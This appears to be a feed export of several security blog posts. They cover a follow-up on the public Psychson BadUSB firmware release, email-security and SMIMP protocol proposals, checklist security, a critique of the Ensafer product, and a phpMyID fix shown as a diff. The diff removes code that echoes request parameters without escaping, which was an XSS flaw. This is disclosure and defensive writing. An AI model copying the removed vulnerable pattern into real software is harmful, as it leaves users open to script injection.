<p>The question came up in a conversation after the talk - we’ve not had the time to dig into this feature more since then, but it’s looking like it’s just a password check with no encryption.</p>

<p>The password changing patch was added at the last minute, to replace another demo that we didn’t like - we identified the USB command being sent, and patched it. Due to time constraints we didn’t dig into the feature to verify the document (from a device manufacturer) was correct; after the question was raised we dug into a little more and looked for other documentation and code to support the claim - it looks like the document we were referencing was incorrect.</p>

<p>So, it looks like I misspoke - the patch still works as expected, though the feature itself seems to provide less protection than we initially though. Sorry!</p>

<h3>The Code &amp; Docs</h3>

<p>We have everything on the <a href="https://github.com/adamcaudill/Psychson">repo</a> now, and we’ve added some additional documentation to the <a href="https://github.com/adamcaudill/Psychson/wiki">wiki</a>.</p>

<p>This isn’t simple to do - the code is complicated to write, and the effort to use the patches and custom firmware is a bit more than I’d like. We’ve tried to document things as well as we can, hopefully it’s easy enough to understand.</p>

<h3>Next Steps</h3>

<p>We really hope that releasing this will push device manufactures to insist on signed firmware updates, and that Phison will add support for signed updates to all of the controllers it sells.</p>

<p>Phison isn’t the only player here, though they are the most common - I’d love to see them take the lead in improving security for these devices. They have an opportunity to stand up and protect users - as the most common provider of these controllers, I’d truly love to see them take this as an opportunity to lead the industry.</p>

<p>What we’ve released just scratches the surface of what can be done here - until signed updates are enforced, there’s no telling what games these devices could be playing.</p>

      <title>IETF Action on Secure Email</title>
      <description><p>Early last week I emailed a group of IETF Area Directors, for the Security and Applications areas, asking them to start the process of creating a new Working Group to address the issues around email security. (Thanks Adrian Farrel for the prodding!)</p>

<p>Today, the first result of the effort has been completed - the new <a href="https://www.ietf.org/mailman/listinfo/endymail">endymail</a> mailing list. An IETF venue to discuss how these issues can be addressed, hopefully laying the ground work updated standards to improve email as we know it today, and eventually standardizing a replacement to SMTP and related protocols. Here&#8217;s the description that the group came up with for the new list:</p>

<blockquote><p>There is significant interest in improving the<br/>privacy-related properties of Internet mail. One focus of<br/>current efforts is on the per-hop (connection-based)<br/>protections provided by TLS. However a wide range of other<br/>work has a focus on end-to-end protection, at the Internet<br/>scale of billions of end users and perhaps millions of<br/>operators.  Such work typically involves new forms of mail<br/>header or body protection, new public key management<br/>(compared to S/MIME or PGP), and security mechanisms more<br/>appropriate for mobile/web user-agents.  Other<br/>security-relevant approaches may be discussed if needed.<br/>Various proposals and development efforts on this topic are<br/>underway outside the IETF. This mailing list provides an<br/>IETF venue for discussion of elements that might be commonly<br/>needed by such efforts and to identify work that the IETF<br/>could do to aid in achieving better end-to-end security<br/>deployed for Internet email.</p></blockquote>


<p>While the creation of another mailing list is far from ground breaking, it&#8217;s the necessary first step in standardizing a solution to a decades old problem.</p>

<p>I encourage everyone interested in email security and privacy to join the list, and participate in the discussions that will lead to new standards. (Though please wait a bit for people to subscribe before starting discussions.)</p>

<p>A big thanks to Stephen Farrell, Joe Hildebrand, and Pete Resnick for their enthusiastic support for this effort.</p>

      <title>SMIMP at the DEFCON Crypto Village</title>
      <description><p>Last week I gave a lighting talk at the DEFCON CryptoVillage on <a href="http://smimp.org/">SMIMP</a>. The talk went over the basics of why the project is needed, and how the specification works.</p>

<p>Here are the slides:</p>

<iframe src="https://adamcaudill.com///www.slideshare.net/slideshow/embed_code/38040741?rel=0&startSlide=2" width="512" height="421" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>


<p>Here is a rough transcript of the talk:</p>

<p><em>Slide 1:</em> I&#8217;m Adam Caudill, I’m a developer and security researcher; I work on a number of different things, but my recent work has been around privacy and secure messaging.</p>

<p>We all know that email security is a real problem, and thanks to a certain whistleblower we know those weaknesses are actively being exploited on a massive scale. I&#8217;m here to talk about some of the issues, and a project I&#8217;ve been working on called SMIMP. It&#8217;s a secure messaging protocol that aims to address the use cases of email, and to be a viable option to replace email as we know it.</p>

<p><em>Slide 2:</em> This image illustrates the issues with email better than anything I&#8217;ve seen.</p>

<p>It&#8217;s decades old, wasn&#8217;t designed for the threats that exist today, and as a result - this is what we&#8217;ve done to it. We&#8217;ve glued on various bits to make it look and feel like something it isn&#8217;t. STARTTLS helps protect from passive monitoring, but that&#8217;s only one attack vector out of so many - and even then, it&#8217;s often opportunistic, so it fails open and is subject to Man In The Middle attacks.</p>

<p>GPG helps protect message content, but it&#8217;s hard for the average user to understand and doesn&#8217;t do anything for metadata.</p>

<p>No matter what we try to glue on to email, it&#8217;s still a protocol that fails on many fronts.</p>

<p><em>Slide 3:</em> Not only is email as it exists today not designed to provide any protection from state-level attackers, it doesn&#8217;t even provide any protection from a rogue sysadmin. Thanks to the various bits that have been glued on over the years, it&#8217;s a bit better when circumstances are ideal - but it still fails on so many fronts.</p>

<p>For a messaging protocol to have any chance of being secure, privacy and security need to be evaluated and included in every design decision, from the very first day - attempting to glue them on after the fact leads to the kind of failure we&#8217;ve seen with email.</p>

<p>I know I&#8217;m preaching to the choir here. We all know it&#8217;s a mess, we all know it&#8217;s a problem that needs to be addressed.</p>

<p><em>Slide 4:</em> There are many people looking to make the situation better, and on many fronts, and these efforts  do help a little bit at a time - but often only for people that know how to leverage the tools, or can get others to implement solutions. For the vast majority of users, the current state of email security is pretty dismal.</p>

<p>The question is, does it make sense, in the long term, to keep trying to find ways to improve email with security focused clients (such as Mailpile), better self-hosting setups, fighting companies to implement STARTTLS, and so on. Or, should we be pushing for a new protocol that&#8217;s built for security and privacy from the ground up? Avoiding the mistakes of the past, shedding the dead weight of obsolete protocols and techniques.</p>

<p>There are huge compatibility and interoperability issues that have to be addressed for any protocol to be successful of course - when you are trying to replace a system used by billions, dealing with legacy systems is something of a big deal.</p>

<p>The fact is, it <em>needs</em> to be replaced with something better, but even calling such an effort a massive undertaking is an understatement. But, if it is to be replaced, it needs to start with groups like this, so that what&#8217;s built will live up to the demands that will be placed on it.</p>

<p><em>Slide 5:</em> Towards the goal of finding a better option for email, I began writing a specification. If I&#8217;m going to complain about a problem I should offer a solution, right?</p>

<p>SMIMP is a general purpose messaging system designed with a few key goals in mind:</p>

<ul>
<li>Minimal metadata</li>
<li>Encrypt as much as possible</li>
<li>Covers existing email use cases</li>
<li>Simple to use; normal users need to be able to use it</li>
<li>Useable in corporate environments that have special handling requirements - such as HIPAA, SarbOx, etc. - This is a big advantage against options like bitmessage; there has to be a balance between security, and meeting the varying demands of the different environments this could be used in.</li>
</ul>


<p>Another goal is ease of implementation - on both the client and server ends; so it&#8217;s a REST-like web service, and the data is passed as JSON. This way developers can leverage well-tested code instead of writing everything from scratch. This also means that it&#8217;s easy for people to host their own server with a minimal time / effort investment.</p>

<p><em>Slide 6:</em> SMIMP is made up of two major components, identity management and messaging. I believe it&#8217;s critical that these are combined into a single protocol to allow for key pain points in traditional email to be addressed - the largest being public key discovery. For GPG, this can be a real challenge for users, especially when trying to find the key for certain high-profile people; has anyone looked for Jacob Applebaum&#8217;s key? It&#8217;s Bad.</p>

<p>Every user has one public signing key in their profile information - the key is tied to the user&#8217;s address, so to find a user&#8217;s key, all you need is their address. This provides a clean, simple way to identify the appropriate key for a user. Of course, ideally users should verify public signing keys via a trusted channel such as a phone call.</p>

<p>To protect the integrity of the profile information, all changes are signed with the user&#8217;s signing key, and includes the hash of the prior change - creating a hash chain from the first, to the most recent change, allowing for simple validation that the records haven&#8217;t been altered.</p>

<p>To protect against a malicious server, there are a couple checks that clients can perform:</p>

<ul>
<li>Pin the most recent signing key, if it disappears from the user&#8217;s profile, then the information is being truncated, possibly to force the use of a compromised key.</li>
<li>Pin the original signing key from when the account was created; if that ever changes, that is a clear indication that the entire history for a user has been replaced.</li>
</ul>


<p>On the messaging side, all messages and most metadata is encrypted; the only data exposed is the data needed for the server to function. There are multiple message types, so not only does it support email like messages, it supports custom, application specific messages; this allows other message-centric applications to use SMIMP as a transport, making it easier to build secure messaging applications.</p>

<p>There are a few anti-spam protections in place - seeing as the server won&#8217;t be able to scan content anymore.</p>

<ul>
<li>Dynamic hashcash-like proof of work</li>
<li>Blacklists to reject everything from an address or domain</li>
<li>Whitelists to allow addresses or domains to bypass the proof of work check.</li>
</ul>


<p>The envelope is JSON, for email, the message is JSON, the formats are extensible, making it easy to add new functionality.</p>

<p>Everything is designed around a simple set of principles:</p>

<ul>
<li>Secure</li>
<li>Private</li>
<li>Easy to implement</li>
<li>Hard to screw-up</li>
</ul>


<p><em>Slide 7:</em> So, what&#8217;s the status today&#8230;</p>

<p>The specification is still a work in progress and is available from smimp.org, along with more background of what it is, and why it&#8217;s designed the way it is.</p>

<p>I wouldn&#8217;t try building against it just yet, it&#8217;s still too immature, but if anybody wants to put their 2 cents in, the specification is on github and pull requests are welcome. The goal here is to get feedback, address issues, and try to build a community driven specification - my goal isn&#8217;t to write a specification myself and then push it on the world assuming it&#8217;s perfect.</p>

<p>I&#8217;ve invested a fair bit of time into SMIMP, but it&#8217;s certainly not perfect, and the final solution to the email problem may not be anything like SMIMP - and I&#8217;m fine with that.</p>

<p>What&#8217;s needed is more people looking not at how to we glue more things on email, but looking at how could we replace it. We need to get more people talking about possible solutions, for more people to contribute to specifications, or write new ones, to get more people focused on the one goal that will actually fix email security - replacing it.</p>

<p><em>Slide 8:</em> I encourage you to look at the specification, to think about how replacing email could be achieved, and find people to work with to achieve this.</p>

<p>If you have any questions, suggestions, or complaints - I&#8217;ll be in the area for a bit.</p>

<p>Thanks!</p>

      <title>On Strong Identity Management</title>
      <description><p>Alice wants to send an encrypted message to Bob; she knows his address, but doesn&#8217;t know the public key that goes with that address. Using GPG, Alice would look up his address on a key server, the issue is of course that anyone can upload a key associated with Bob&#8217;s address.</p>

<p>Using the &#8220;web of trust&#8221; model, Alice would look at the different keys and see which ones are signed, and if any of them are signed by people she knows. The problem is that Alice doesn&#8217;t normally use GPG, and she hasn&#8217;t marked the keys of the people she knows as trusted (I expect this is true for most casual GPG users), thus, she can&#8217;t tell what key is signed by keys she should trust, versus the ones signed by keys she shouldn&#8217;t.</p>

<p>In years of effort, this is still an issue.</p>

<p>There are many issues with this model, especially when it comes to casual users that don&#8217;t understand the details of the &#8220;web of trust&#8221; - while GPG use is certainly going up thanks largely to the Snowden revelations, many of these users fit into the casual users group. Thanks to the complexities of the model, these users may not be getting the level of protection they think they are.</p>

<p>Here are just a few of these issues:</p>

<ul>
<li>Lack of strong linking - there isn&#8217;t a strong, verifiable connection between a user&#8217;s address, and their public key.</li>
<li>Complex user interaction - to be useful, the user has to understand the web of trust model, and how to leverage it. Based on the discussions I&#8217;ve had with people that recently started using it, most don&#8217;t get it.</li>
<li>Key discovery - finding the right key can be a nightmare, especially for some people. When there are multiple &#8220;valid&#8221; keys published, each with signatures, it can be hard for novice users to figure out which one is right.</li>
</ul>


<p>I could go on, but I think the point is clear - the web of trust works well for some users, but only the users that take the time to really understand it.</p>

<p><strong>The <em>IM</em> in SMIMP</strong></p>

<p>I&#8217;ve been drafting a <a href="https://github.com/smimp/smimp_spec">specification</a> for a secure messaging protocol called <a href="http://smimp.org/">SMIMP</a>, as far as I&#8217;m concerned the Identity Management component is the most important part. It&#8217;s what allows the rest to work - secure messaging isn&#8217;t that hard, key handling and validation is where end user system start to fail.</p>

<p>To provide a strong identity management system, a few goals need to be met:</p>

<ul>
<li>Strong link between address and public key.</li>
<li>Updates to identity information signed by the user to prevent unauthorized changes.</li>
<li>Provide a full history, including all changes from the time the account was created.</li>
<li>Use of a hash-chain to show that no changes have been removed.</li>
</ul>


<p>The IM in SMIMP meets all of these. The suggested way of using the system is trust on first use, pinning on both the first and the most recent public key. It would also be wise for the user to validate the recipient&#8217;s current public key via a trusted channel on first use, but that&#8217;s something that rarely happens in practice.</p>

<p>To detect a malicious server, or modified traffic, the user&#8217;s client should first check to see if the original public key has changed - if it has, it indicates that the user&#8217;s information has been replaced in its entirety. Second, it should see if the most recent key is no longer listed in the user&#8217;s history - if its been removed, it indicates that the user&#8217;s history has been truncated, possibly in an attempt to encourage the use of a compromised key. These checks provide an easy way for client software to validate that keys can be trusted.</p>

<p>To make the system more useful, the SMIMP identity information includes more than just the public key (all of which are optional):</p>

<ul>
<li>Name</li>
<li>Web site</li>
<li>List of social media profiles</li>
<li>Additional data (comments, or other data the user wishes to assert)</li>
</ul>


<p>This provides a simple way to strongly tie addresses to public keys; thus making secure messaging easier and more understandable for casual / non-technical users. For a solution to be widely useable, it needs to be effective for everyone.</p>

<p><strong>The best solution?</strong></p>

<p>SMIMP may not be the best solution, and there are some things about it that I don&#8217;t care for myself - such as exposure of more metadata than I&#8217;d like. But, it is a solution to the issues surrounding email, and identity management.</p>

<p>The <a href="https://adamcaudill.com/2014/06/27/the-sinking-ship-of-email-security/">issues</a> of email security can be fixed, and identity management is part of that problem. There has to be a way to tie a user to their public key in a more reliable manor than what we have today (and without resorting to the mandatory government ID idea that won&#8217;t die).</p>

<p>I encourage everyone to look at these issues, and think about possible solutions. Contribute to SMIMP or one of the other efforts to fix the issues around email; we can no longer ignore these issues. The community needs to find and implement solutions that assure the security and privacy of the global community.</p>

      <title>Jumping through hoops&#8230;</title>
      <description><p>There are two ways to implement security:</p>

<ul>
<li>Real security, based on empirical evidense and analysis.</li>
<li>Checklist security, based on the latest checklist somebody says is important.</li>
</ul>


<p>When security is based on real evidence and analysis, policies are enacted based on real gain and measured against the business impact. Risks are considered, and the costs versus benefits are well understood so that policy choices are based on real, useful information.</p>

<p>On the other hand there&#8217;s security by checklist. Costs aren&#8217;t calculated, risks aren&#8217;t understood, business impacts are ignored. All that matters is that somebody gets to check a box on a form; there&#8217;s no understanding, no logic, and likely no real benefits involved.</p>

<p>The point of security policies isn&#8217;t to show off how many hoops you&#8217;ve built that people have to jump through when doing their jobs. Yet, when a company accepts a security by checklist mentality, this is exactly what they are doing. They spend their time building hoops that they can show off later while ignoring the threats they are supposed to be addressing.</p>

<p>Recently, my laptop died, the new laptop was setup with DLP, or digital loss prevention software. The main purpose of the software is to prevent me and anyone in my group from being able to use removable drives - so that we can&#8217;t load them up with private information of course.</p>

<p>This was done to check a box on a form, at no point did anyone actually think about the bigger picture, what the threat was, and how it should be addressed:</p>

<ul>
<li>I have a laptop and work remotely.</li>
<li>When I disconnect from the VPN, I have unrestricted access to the internet.</li>
<li>I routinely work with sensitive data, so it&#8217;s not uncommon for it to be on my computer.</li>
<li>I could easily encrypt a file full of private data, and upload it to the cloud after disconnecting from the VPN, and nobody would know.</li>
</ul>


<p>So, by blocking the use of removable drives, they made it much harder for me to recover from a failing laptop, and added nothing to security. Blocking thumb drives won&#8217;t stop a person from stealing data when they have other ways they could do the same thing. All it did was waste time and the company&#8217;s money.</p>

<p>They built a new hoop to show off, nothing more.</p>

<p>Such policies don&#8217;t help anyone - they don&#8217;t improve security, they certainly don&#8217;t prevent theft of data, and at the same time, they do have a negative business impact. Lost productivity, increased frustration, and in the end higher turn-over from employees that are fed up from the meaningless work. There&#8217;s no winner here - except the person that wants to show off all of the hoops they have.</p>

<p>Security based on anything other than empirical evidence and legitimate analysis is just theater and nothing more.</p>

      <title>The Sinking Ship of E-Mail Security</title>
      <description><p>E-Mail, the venerable old standard for internet text messages, dating back to the early 1980s - and back to the early 1970s in other forms, has long been the &#8220;killer app&#8221; of the internet. While so many companies try to make the next great thing that&#8217;ll capture users around the world - none of these compare to the success of e-mail. It is likely the single most entrenched application-layer protocol used today.</p>

<p>Thanks to <a href="https://en.wikipedia.org/wiki/Stellar_Wind">STELLARWIND</a> and other NSA programs, we have also seen that it has failed in a very real, and very important way.</p>

<p>But this isn&#8217;t exactly news is it?</p>

<p>The security issues around e-mail - or rather the complete lack of security in the protocol has been well understood for decades. Yet, in all those years of existence, all we, as those that care about security have managed to do is glue ineffective solutions on it.</p>

<p><strong>STARTTLS</strong></p>

<p>In the last year, since the scope of NSA&#8217;s spying has been made clear to the world - and the reminder that the NSA isn&#8217;t the only player in this game, the use of STARTTLS has <a href="https://www.google.com/transparencyreport/saferemail/?hl=en">spread dramatically</a>. Many people have worked hard to make this happen - and it really has made things better. Kinda.</p>

<p>While STARTTLS does enable TLS, thus encrypting the data over the wire, it&#8217;s far from perfect:</p>

<ul>
<li>Opportunistic - In the majority of occasions the encryption is opportunistic; meaning that certificates aren&#8217;t validated, and if something goes wrong in the TLS negotiation, the connection will fail-open - passing data in the clear.</li>
<li>Server Trust - E-mail as it exists today places complete trust in not only the sending server, but also the recipients server - and every other relaying server. Any of these can log all correspondence, as the data is only encrypted during the transport. TLS can be added or dropped at any point in the chain, and this exposes multiple possible intercept points.</li>
</ul>


<p>Based on the famous &#8220;SSL added and removed here&#8221; NSA slide, we see that even if the messages are sent over an encrypted connection, that doesn&#8217;t mean they stay encrypted when moved around within a company. There are so many failure points that can lead to an attacker being able to collect data.</p>

<p>So if groups like the NSA want e-mail, it takes some extra effort thanks to STARTTLS, but it doesn&#8217;t solve the problem.</p>

<p><strong>PGP / GPG</strong></p>

<p>PGP, and the compatible (and likely more commonly used) GPG are one of the best options people have to encrypt their email - but there&#8217;s still a great deal of data exposed.</p>

<ul>
<li>UX - The user experience for most applications goes beyond unfriendly, to the point of being actively hostile. I recently walked an experienced developer through setting up a key with Gpg4win - the process of getting everything setup and working was beyond painful. The only GPG wrapper that I&#8217;ve seen that isn&#8217;t unreasonably difficult is GPGTools for OSX.</li>
<li>Web of Trust - The web of trust model that PGP uses is both genius and terrible. When a news organization started using PGP, I noticed that none of their keys were signed by anyone - so I tried explaining the concept to one of their journalists. After several tweets we moved the conversation to e-mail, which led to several multi-page emails. By the end, I think he was more confused than ever. Last I checked, their keys still aren&#8217;t signed.</li>
<li>Metadata - <a href="http://abcnews.go.com/blogs/headlines/2014/05/ex-nsa-chief-we-kill-people-based-on-metadata/">Metadata kills</a>. It&#8217;s scary but true - people die based on who they talk to. How long till an investigative journalist reporting on an organization not friendly to the US gets droned for emailing the wrong people? PGP doesn&#8217;t hide who is emailed, the subject, or any of the headers. PGP encrypted email leaks useful information like a sieve.</li>
<li>Client Integration - Not many email clients natively support PGP, so most users have to encrypt manually, or use a third-party add-on. This can lead to interesting information leaks, such as saving unencrypted drafts to the server.</li>
<li>Mobile - Using PGP on a mobile device can be risky, as it requires storing the private key on devices that are likely to have known security issues. Many people recommend against it, as it puts the private key at too much risk.</li>
</ul>


<p>So while PGP / GPG protects the content of email, it still is subject to metadata collection.</p>

<p><strong>S/MIME</strong></p>

<p>For those that don&#8217;t like PGP, or want a better chance of having native support, there&#8217;s S/MIME. Like PGP, S/MIME has it&#8217;s share of issues which leave users with less protection than they realize.</p>

<ul>
<li>Certificates - To use S/MIME, you have to have a certificate issued from a CA. The question is, how trustworthy is it? CAs have been hacked to issue bad certificates in the past, and nobody knows what an NSL could be used for when issued to a CA.</li>
<li>Key Escrow - Some CAs generate the private key on their side to allow them to provide a key escrow service. While this can be useful if you ever lose your key and want to read your email again, it also runs the risk of an unauthorized party getting access to the key.</li>
<li>Metadata - The metadata issues noted for PGP applies here as well. The subject, the recipients, the headers are all in clear text.</li>
</ul>


<p>There are other various complaints around S/MIME that are well documented, and have been discussed countless times. The point is, it&#8217;s another partial solution just glued onto email in an attempt to make it do something it was never designed to do. Be secure.</p>

<p><strong>The list goes on&#8230;</strong></p>

<p>Much work has went into other various add-ons, such as SPF and DKIM and others that attempt to do things that could have been done by default if e-mail had been designed with authentication, privacy, and security in mind.</p>

<p>When e-mail was designed, none of these issues were considered - people have been trying to find ways to fix that mistake for years. E-mail was open, plain text, security and privacy weren&#8217;t considered - or at least not to the extent required.</p>

<p>For a system like e-mail to be secure, security has to be part of the core design, considered at every step. When security &amp; privacy are an afterthought, something to just glue on - it&#8217;s impossible to achieve either.</p>

<p>There are many efforts underway now to improve the situation, some such as <a href="https://www.mailpile.is/">Mailpile</a>, I greatly respect. Their goals are noble, their purpose is true - but I also think they are fighting the wrong battle. E-mail as we know it is flawed beyond repair - we can make it leak less, but for all the work trying to overcome the design flaws, it&#8217;ll always be flawed. There&#8217;s only one way for e-mail to ever be secure.</p>

<p><strong>Time for action!</strong></p>

<p>Over the past few months I&#8217;ve been working on a specification for a system to replace e-mail. I don&#8217;t know if it&#8217;ll ever go anywhere - but that&#8217;s not the point. E-mail as we know it needs to be replaced - it can&#8217;t be fixed. We need to be discussing how to eliminate email, not new ways to glue partial solutions on to it. STARTTLS isn&#8217;t the answer, PGP isn&#8217;t the answer, S/MIME isn&#8217;t the answer - an entirely new protocol is.</p>

<p>I&#8217;m hoping to make the first public draft available in the next few weeks. If it&#8217;s well received, I&#8217;ll try to do what I can to get the system built. If not, then hopefully others will write competing specifications, and I&#8217;ll aide them as I can.</p>

<p>My goal for the specification I&#8217;m writing is to encourage discussion - to get people talking about how to solve the problem. If it contributes in any way to a new system, a system that&#8217;s designed from the beginning to be secure, then it&#8217;s worth every minute that&#8217;s been invested in it. We need to find a viable option that can replace the monstrosity that we have today.</p>

<p>I encourage everyone to think about solutions to this - how can we build a viable replacement to e-mail that meets the privacy and security goals, while being user friendly, and meeting the requirements of business and government environments. It&#8217;s a hard problem to solve, but it can be solved. It&#8217;s up to us to do it.</p>

      <title>phpMyID: Fixing Abandoned OSS Software</title>
      <description><p><a href="http://siege.org/phpmyid">phpMyID</a> is a simple solution for those that want to run their own OpenID endpoint - the problem is that its author stopped maintaining the project in 2008. Despite this, there&#8217;s still quite a few people that use it, because it&#8217;s the easiest single-user OpenID option available.</p>

<p>Unfortunately, the author didn&#8217;t follow best practices when building the software, and as a result multiple security flaws were introduced. In 2008, a XSS was identified and never fixed (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2008-4730">CVE-2008-4730</a>), in the years since then it seems the software has been below the radar. While conducting a pentest I discovered a previously undocumented XSS (CVE-2014-2890) - which left me with a dilemma - what to do about it?</p>

<p>Looking at the code, I found a couple more potential XSS vulnerabilities - so the application clearly needed help, and if the author won&#8217;t do it, somebody should. Ethically, it seemed wrong to disclose the issue but leave users to fend for themselves; full disclosure is normally used to push a vendor into acting - but in this case it&#8217;s assured that there won&#8217;t be a vendor response.</p>

<p><strong>Fixing The Code</strong></p>

<p>One good thing is if a OSS project is abandoned, anyone can prepare patches to fix the issues. So, <a href="https://github.com/adamcaudill/phpMyID">that&#8217;s what I did</a>. I&#8217;ve committed fixes for both CVE-2008-4730 and CVE-2014-2890, as well as a couple potential issues. In both cases, the fix was easy:</p>

<p>CVE-2008-4730:</p>

<pre><code>@@ -439,7 +439,7 @@ function checkid ( $wait ) {
    if ($trust_root != $return_to) {

 -          error_500('Invalid trust_root: "' . $trust_root . '"');
 +          error_500('Invalid trust_root: "' . htmlentities($trust_root, ENT_QUOTES) . '"');

    }

 +      ? wrap_html(htmlentities($_REQUEST['openid_error'], ENT_QUOTES))
        : error_500();
  }
</code></pre>

<p>I&#8217;ve only given the code a quick once-over, so there may be other issues - if I find time for a more thorough review I may commit additional fixes.</p>

<p><strong>Status of phpMyID</strong></p>

<p>I&#8217;m not taking over the maintenance of the project, I simply don&#8217;t have time to do the cleanup needed to bring it up to reasonable standards. I&#8217;d love to see somebody with a little time to invest cleanup the code and add more defensive measures. It needs some help, that&#8217;s clear.</p>

<p>One of the things I&#8217;d love to see fixed is the way the user&#8217;s password is stored - it&#8217;s currently stored in the <code>MyID.config.php</code> file as a MD5 hash - making brute-forcing entirely too easy. Hopefully <a href="http://tools.ietf.org/html/draft-ietf-httpauth-digest-06">this</a> Internet Draft will be adopted soon, obsoleting <a href="http://tools.ietf.org/html/rfc2617">RFC 2617</a>, which will be an easy win to improve the security of the password when in transit. There are many places where the code can be improved by somebody with a little time.</p>

<p>If you are using phpMyID today, replace the <code>MyID.php</code> file with the one <a href="https://raw.githubusercontent.com/adamcaudill/phpMyID/master/MyID.php">here</a> (it also fixes compatibility with PHP 5.4).</p>

      <title>Security By Buzzword - Why I don&#39;t support Ensafer</title>
      <description><p><strong>Update</strong>: I had a call with Ensafer&#8217;s CTO, Trygve Hardersen to discuss the issues I brought up, and what they can do about it. First, they updated the site so that downloads are now over HTTPS. He stated that the infrastructure that powers their service is separate from the website, and everything is over HTTPS. They are working on making documentation available, and hope to have the first documents available soon. Once I get a chance to look over their documentation, I&#8217;ll post further updates.</p>

<p><a href="http://www.ensafer.com/">Ensafer</a> is an overlay to Dropbox that offers end-to-end encryption, the goal being to address privacy concerns that Dropbox can access user&#8217;s files - and thus possibly the US Government (via NSLs, etc.). This sounds like a great idea - end to end encryption is the best way to prevent unjustified surveillance, and I do use a competing product (<a href="https://www.boxcryptor.com/">Boxcryptor</a>), so I support the concept, but what about Ensafer&#8217;s implementation - does it provide the level of security desired?</p>

<p><strong>Where are the details?</strong></p>

<p>If you look at Ensafer&#8217;s site, you&#8217;ll find precious few details on what they are doing - plenty of security buzzwords, but no specifics. Let&#8217;s take a look at the <a href="https://ensafer.zendesk.com/hc/en-us/articles/200797297-Industry-standard-RSA-and-AES-cryptography">one page with details</a>:</p>

<blockquote><p>Ensafer believes in standards and we don&#8217;t use any custom encryption algorithms. Our encryption platform is built on:</p><p>2048-bit RSA keys<br/>256-bit AES encryption<br/>2048-bit SSL<br/>PKCS#12 key containers<br/>X.509 certificates</p></blockquote>


<p>We see some algorithm names - but what about key derivation, or symmetric encryption modes? How about hashing algorithms? How and where is your password stored? There are so many implementation details that are critical for security, yet aren&#8217;t talked about at all.</p>

<p>In December of 2012 I started asking about details, they pointed me back to the web site - when I pushed for more, I was told that they were working on a whitepaper to explain their implementation:</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p><a href="https://twitter.com/adamcaudill">@adamcaudill</a> We have not published all technical details, but we&#39;re working on a whitepaper which will be published later. ^LS</p>&mdash; Ensafer (@Ensafer) <a href="https://twitter.com/Ensafer/statuses/275616564085149698">December 3, 2012</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>More than a year later, I&#8217;m still waiting to see those details.</p>

<p><strong>So have they conducted an audit?</strong></p>

<p>Since they haven&#8217;t released details publicly, if they conducted an external audit, that would bring some trust. So, recently I asked, and this is what they had to say:</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p><a href="https://twitter.com/adamcaudill">@adamcaudill</a> Thanks for your important question. There hasn’t been an audit yet due to work in progress, but will be done this year.</p>&mdash; Ensafer (@Ensafer) <a href="https://twitter.com/Ensafer/statuses/447156694041509889">March 21, 2014</a></blockquote>

<p>After the delay in getting useful details published, I&#8217;m not hopeful that we&#8217;ll see the results of an audit in the near future.</p>

<p><strong>TLS &amp; Safe Downloads</strong></p>

<p>I really wish that the lack of details was the only concern - but it&#8217;s not. The first thing I noticed is that their web site doesn&#8217;t force TLS, so I manually switched to HTTPS, unfortunately the result wasn&#8217;t what I was hoping for:</p>

<p><img class="center" src="https://adamcaudill.com//files/Ensafer_SSL_Error.png"></p>

<p>Well, that&#8217;s not encouraging. Let&#8217;s take a look at the download link:</p>

<pre><code>http://get.ensafer.com/mac/prod/Ensafer-1.0.8.dmg
</code></pre>

<p>When you try the same link over HTTPS, it&#8217;s even worse:</p>

<p><img class="center" src="https://adamcaudill.com//files/ensafer_dl_no_tls.png"></p>

<p>For a security product, I&#8217;d expect the download to be over HTTPS to prevent an attacker from redirecting a victim to a malicious version. This isn&#8217;t the kind of mistake I&#8217;d expect from people building advanced security tools. When you see issues like this, it&#8217;s common to see more problems, so this may just be the tip of the iceberg.</p>

<p><strong>Is it trustworthy?</strong></p>

<p>I would like to say that it&#8217;s safe to use, and that it lives up to the promises made - but they haven&#8217;t made enough information available for people to make an informed decision. If you add the lack of information with such basic mistakes as not making the download available over HTTPS, it doesn&#8217;t instill much confidence. Companies focused on security should know better.</p>

<p>When you make decisions about what tools you use, you have to look at the full picture - and Ensafer is a great example of that. They&#8217;ve focused first on a pretty website, adding features - but not assuring trust. At this point, the only evidence of their security is the use of buzzwords.</p>

      <title>HTTP Considered Harmful - The Need For Negative Feedback</title>
      <description><p>We all know, and well understand what this means when we see it in a browser:</p>

<p><img class="center" src="https://adamcaudill.com//files/GitHub_EV_Cert.png"></p>

<p>It means that the connection is encrypted, and that some degree of validation has occurred to verify that the server is who it claims to be. Through the years, users have been taught to trust sites when they see that, or the all too familiar &#8216;lock&#8217; icon - when users see it, they assume their data is safe.</p>

<p>But what about this?</p>

<p><img class="center" src="https://adamcaudill.com//files/reddit_no_ssl-2.png"></p>

<p>There&#8217;s no lock to tell them they are safe, but there&#8217;s also no warning to indicate that the connection isn&#8217;t secure. There&#8217;s no encryption, no validation, - no protection at all. With HTTP, users are afforded nothing at all to protect them - but we all know that, right? Does the average user understand that though? Do they understand how easily they could be <a href="http://arstechnica.com/tech-policy/2014/02/new-snowden-docs-show-nsa-gchq-spied-on-wikileaks-pirate-bay-users/">monitored</a>, or how easily traffic can be <a href="https://www.schneier.com/blog/archives/2013/10/how_the_nsa_att.html">altered</a>?</p>

<p><strong>The Need For Negative Feedback</strong></p>

<p>Strong negative feedback has long been used in browsers to warn against invalid or expired certificates - but there&#8217;s no feedback to warn users of just how dangerous HTTP can be. After a discussion on Twitter, a friend of mine, <a href="https://twitter.com/defusesec">Taylor Hornby</a>, created a <a href="https://defuse.ca/web-browser-negative-feedback.htm">mockup</a> of what could be done in Firefox to warn users:</p>

<p><img class="center" src="https://adamcaudill.com//files/ff_no_ssl_xmockup-1.png"></p>

<p>This provides simple, clear feedback to the user that they shouldn&#8217;t trust the site - it doesn&#8217;t present an error or anything to interrupt the user, but does make them aware of the risks they are taking.</p>

<p>We, the security community, owe it to users to provide them with useful feedback so that they can protect themselves - providing negative feedback in the browser showing the weakness of HTTP would be a large step in that direction - and to urge site owners to adopt HTTPS as soon as possible.</p>

      <title>On Opportunistic Encryption</title>
